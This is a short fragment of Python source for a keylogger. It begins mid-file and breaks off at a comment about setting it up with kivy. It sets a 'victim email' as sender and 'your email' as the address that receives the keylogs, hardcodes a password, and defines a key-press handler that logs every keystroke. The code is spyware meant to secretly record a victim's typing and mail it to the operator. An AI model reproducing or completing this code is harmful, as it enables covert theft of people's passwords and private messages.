...
sender_email = "victim email" # Your email address
receiver_email = "your email" # The email address to receive the keylogs
password = "asdf1234" # Your email password

# Define the keylogging function
def on_press(key):
    logging.info(key)

# Set up the keylogger kivy
